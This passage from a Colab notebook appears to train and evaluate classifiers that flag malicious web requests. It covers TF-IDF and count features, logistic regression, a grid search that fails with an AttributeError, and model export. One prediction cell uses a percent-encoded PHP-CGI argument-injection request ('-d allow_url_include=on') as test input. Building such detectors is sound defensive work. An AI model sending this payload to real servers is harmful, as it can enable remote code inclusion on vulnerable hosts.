      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ufoZ78IkxVBy",
        "outputId": "1871140e-ea2b-4566-836e-e4ecc43f485d"
      },
      "source": [
        "# single prediction\r\n",
        "val_1 = t_veczr.transform(['/cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+']) #val_x[109]\r\n",
        "# tf_m.predict(val_1)\r\n",
        "final_model.predict(val_1)"
      ],
      "execution_count": 195,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([False])"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 195
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "UKoN1HfvWhOo"
      },
      "source": [
        "val_x"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ySMnQK2MkBQ7"
      },
      "source": [
        "### 6.4.2 CountVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gaSv9bcJ53oV",
        "outputId": "6dbae3fd-c9e8-4e90-bf33-4e3fb1ea7752"
      },
      "source": [
        "c_preds = c_m.predict(val_term_doc)\r\n",
        "(c_preds.T==test_y).mean()"
      ],
      "execution_count": 172,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0.9974437627811861"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 172
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_U-7J0cHZqYH",
        "outputId": "255aed22-b7c7-4287-cb45-5627531d066f"
      },
      "source": [
        "pr = c_veczr.transform(['com'])\r\n",
        "c_m.predict(pr)"
      ],
      "execution_count": 186,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array([ True])"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 186
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "vCq0u65B6Pjc",
        "outputId": "01db4865-b074-4147-dffe-cf20a91a3578"
      },
      "source": [
        "x_nb = x1.multiply(r)\r\n",
        "c_m.fit(x_nb, y1)"
      ],
      "execution_count": 174,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=100000000.0, class_weight=None, dual=False,\n",
              "                   fit_intercept=True, intercept_scaling=1, l1_ratio=None,\n",
              "                   max_iter=100, multi_class='auto', n_jobs=None, penalty='l2',\n",
              "                   random_state=None, solver='lbfgs', tol=0.0001, verbose=0,\n",
              "                   warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 174
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6cHUPfn77iiF",
        "outputId": "70a39dfa-af3e-4dff-c6db-094ec8c59342"
      },
      "source": [
        "val_x_nb = c_test_x.multiply(r)\r\n",
        "preds2 = c_m.predict(val_x_nb)\r\n",
        "(preds2.T==test_y).mean()"
      ],
      "execution_count": 175,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0.7014314928425358"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 175
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ZHt32AI1hrct"
      },
      "source": [
        "# 7 Grid search"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "E4y5E15uhwwX"
      },
      "source": [
        "## 7.1 Pipeline"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "vaIBE9F4hzpT"
      },
      "source": [
        "pipeline = Pipeline([\r\n",
        "  ('vect', TfidfVectorizer()),\r\n",
        "  ('tfidf', TfidfTransformer()),\r\n",
        "  ('clf', SGDClassifier()),\r\n",
        "])"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "T4_gtWwHjIHF"
      },
      "source": [
        "parameters = {\r\n",
        "  'vect__max_df': (0.0,), #(0.5, 0.75),\r\n",
        "  'vect__max_features': (5000, 10000, 50000),\r\n",
        "  'vect__analyzer': ('char', 'word'),\r\n",
        "  'vect__ngram_range': ((1, 3), (1, 5)),  # unigrams or bigrams\r\n",
        "  'tfidf__use_idf': (True, False),\r\n",
        "  # 'tfidf__norm': ('l1', 'l2'),\r\n",
        "  'clf__max_iter': (20,),\r\n",
        "  'clf__alpha': (0.00001, 0.000001),\r\n",
        "  'clf__penalty': ('l2', 'elasticnet'),\r\n",
        "  # 'clf__max_iter': (10, 50, 80),\r\n",
        "}"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Fh5U3EVMjr8e"
      },
      "source": [
        "grid_search = GridSearchCV(pipeline, parameters, n_jobs=-1, verbose=1)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 408
        },
        "id": "BEMP0d-3jt-t",
        "outputId": "1826b4b4-0d13-43cc-fd8e-6bbac1a7e9b6"
      },
      "source": [
        "grid_search.fit(list(trn_term_doc), trn_y)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Fitting 5 folds for each of 96 candidates, totalling 480 fits\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "[Parallel(n_jobs=-1)]: Using backend LokyBackend with 2 concurrent workers.\n",
            "[Parallel(n_jobs=-1)]: Done  46 tasks      | elapsed:  4.3min\n",
            "[Parallel(n_jobs=-1)]: Done 196 tasks      | elapsed: 18.2min\n",
            "[Parallel(n_jobs=-1)]: Done 446 tasks      | elapsed: 41.3min\n",
            "[Parallel(n_jobs=-1)]: Done 480 out of 480 | elapsed: 44.4min finished\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "error",
          "ename": "AttributeError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-209-15776eb39e46>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mgrid_search\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlist\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtrn_term_doc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtrn_y\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/model_selection/_search.py\u001b[0m in \u001b[0;36mfit\u001b[0;34m(self, X, y, groups, **fit_params)\u001b[0m\n\u001b[1;32m    737\u001b[0m             \u001b[0mrefit_start_time\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtime\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtime\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    738\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0my\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 739\u001b[0;31m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbest_estimator_\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mfit_params\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    740\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    741\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbest_estimator_\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mfit_params\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/pipeline.py\u001b[0m in \u001b[0;36mfit\u001b[0;34m(self, X, y, **fit_params)\u001b[0m\n\u001b[1;32m    348\u001b[0m             \u001b[0mThis\u001b[0m \u001b[0mestimator\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    349\u001b[0m         \"\"\"\n\u001b[0;32m--> 350\u001b[0;31m         \u001b[0mXt\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfit_params\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_fit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mfit_params\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    351\u001b[0m         with _print_elapsed_time('Pipeline',\n\u001b[1;32m    352\u001b[0m                                  self._log_message(len(self.steps) - 1)):\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/pipeline.py\u001b[0m in \u001b[0;36m_fit\u001b[0;34m(self, X, y, **fit_params)\u001b[0m\n\u001b[1;32m    313\u001b[0m                 \u001b[0mmessage_clsname\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m'Pipeline'\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    314\u001b[0m                 \u001b[0mmessage\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_log_message\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mstep_idx\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 315\u001b[0;31m                 **fit_params_steps[name])\n\u001b[0m\u001b[1;32m    316\u001b[0m             \u001b[0;31m# Replace the transformer of the step with the fitted\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    317\u001b[0m             \u001b[0;31m# transformer. This is necessary when loading the transformer\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/joblib/memory.py\u001b[0m in \u001b[0;36m__call__\u001b[0;34m(self, *args, **kwargs)\u001b[0m\n\u001b[1;32m    350\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    351\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m__call__\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 352\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfunc\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    353\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    354\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mcall_and_shelve\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/pipeline.py\u001b[0m in \u001b[0;36m_fit_transform_one\u001b[0;34m(transformer, X, y, weight, message_clsname, message, **fit_params)\u001b[0m\n\u001b[1;32m    726\u001b[0m     \u001b[0;32mwith\u001b[0m \u001b[0m_print_elapsed_time\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmessage_clsname\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mmessage\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    727\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mhasattr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtransformer\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m'fit_transform'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 728\u001b[0;31m             \u001b[0mres\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtransformer\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit_transform\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mfit_params\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    729\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    730\u001b[0m             \u001b[0mres\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtransformer\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mfit_params\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtransform\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/feature_extraction/text.py\u001b[0m in \u001b[0;36mfit_transform\u001b[0;34m(self, raw_documents, y)\u001b[0m\n\u001b[1;32m   1857\u001b[0m         \"\"\"\n\u001b[1;32m   1858\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_check_params\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1859\u001b[0;31m         \u001b[0mX\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msuper\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit_transform\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mraw_documents\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1860\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_tfidf\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mX\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1861\u001b[0m         \u001b[0;31m# X is already a transformed view of raw_documents so\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/feature_extraction/text.py\u001b[0m in \u001b[0;36mfit_transform\u001b[0;34m(self, raw_documents, y)\u001b[0m\n\u001b[1;32m   1218\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1219\u001b[0m         vocabulary, X = self._count_vocab(raw_documents,\n\u001b[0;32m-> 1220\u001b[0;31m                                           self.fixed_vocabulary_)\n\u001b[0m\u001b[1;32m   1221\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1222\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbinary\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/feature_extraction/text.py\u001b[0m in \u001b[0;36m_count_vocab\u001b[0;34m(self, raw_documents, fixed_vocab)\u001b[0m\n\u001b[1;32m   1129\u001b[0m         \u001b[0;32mfor\u001b[0m \u001b[0mdoc\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mraw_documents\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1130\u001b[0m             \u001b[0mfeature_counter\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m{\u001b[0m\u001b[0;34m}\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1131\u001b[0;31m             \u001b[0;32mfor\u001b[0m \u001b[0mfeature\u001b[0m \u001b[0;32min\u001b[0m \u001b[0manalyze\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdoc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1132\u001b[0m                 \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1133\u001b[0m                     \u001b[0mfeature_idx\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mvocabulary\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mfeature\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/feature_extraction/text.py\u001b[0m in \u001b[0;36m_analyze\u001b[0;34m(doc, analyzer, tokenizer, ngrams, preprocessor, decoder, stop_words)\u001b[0m\n\u001b[1;32m    101\u001b[0m     \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    102\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mpreprocessor\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 103\u001b[0;31m             \u001b[0mdoc\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mpreprocessor\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdoc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    104\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mtokenizer\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    105\u001b[0m             \u001b[0mdoc\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtokenizer\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdoc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/sklearn/feature_extraction/text.py\u001b[0m in \u001b[0;36m_preprocess\u001b[0;34m(doc, accent_function, lower)\u001b[0m\n\u001b[1;32m     66\u001b[0m     \"\"\"\n\u001b[1;32m     67\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0mlower\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 68\u001b[0;31m         \u001b[0mdoc\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mdoc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mlower\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     69\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0maccent_function\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     70\u001b[0m         \u001b[0mdoc\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0maccent_function\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdoc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.6/dist-packages/scipy/sparse/base.py\u001b[0m in \u001b[0;36m__getattr__\u001b[0;34m(self, attr)\u001b[0m\n\u001b[1;32m    689\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgetnnz\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    690\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 691\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mAttributeError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mattr\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m\" not found\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    692\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    693\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mtranspose\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0maxes\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;32mNone\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcopy\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;32mFalse\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mAttributeError\u001b[0m: lower not found"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_W-T4tYyjv_l",
        "outputId": "a968deb6-96a1-4c5e-9094-3bf3b2fa779f"
      },
      "source": [
        "grid_search.best_score_"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "nan"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 210
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "OZICIRFKmfRN"
      },
      "source": [
        "# export model"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Rt2lGtc-mhEb"
      },
      "source": [
        "import pickle\r\n",
        "\r\n",
        "model_mypath = 'drive/My Drive/Colab Notebooks/AIacademy/class-C/project/model.pkl'\r\n",
        "with open(model_mypath, 'wb') as f:\r\n",
        "    pickle.dump(final_model, f)"
      ],
      "execution_count": 188,
      "outputs": []
    }
  ]
}